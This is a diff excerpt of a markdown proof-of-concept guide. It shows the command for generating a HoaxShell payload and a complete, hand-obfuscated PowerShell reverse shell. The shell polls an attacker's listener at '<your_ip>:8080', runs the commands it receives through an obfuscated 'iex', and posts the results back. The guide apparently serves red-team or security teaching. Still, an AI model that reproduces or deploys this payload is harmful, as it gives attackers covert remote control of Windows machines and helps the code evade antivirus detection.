@@ -47,7 +47,7 @@ sudo python3 hoaxshell.py -s <your_ip> -r -H "Authorization"
 
 ![Generating Payload using HoaxShell](/images/POC_4/Preparation/POC4_Generating_Payload.png)
 
-4. Manually obfuscating HoaxShell Script by adding `'` and `splitting strings of character`, and `randomising casing of PowerShell functions`
+4. Manually obfuscating HoaxShell Script by adding `'`, `splitting strings of character`, and `randomising casing of PowerShell functions`
 
 ```ps1
 $xxx='None';$s='<your_ip>:8080';$i='83d2a6b0-c13433e2-5ea52d90';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/83d2a6b0 -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/c13433e2 -Headers @{"Authorization"=$i}).Content;if ($c -ne $xxx) {$r=i''e''x $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/5ea52d90 -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}
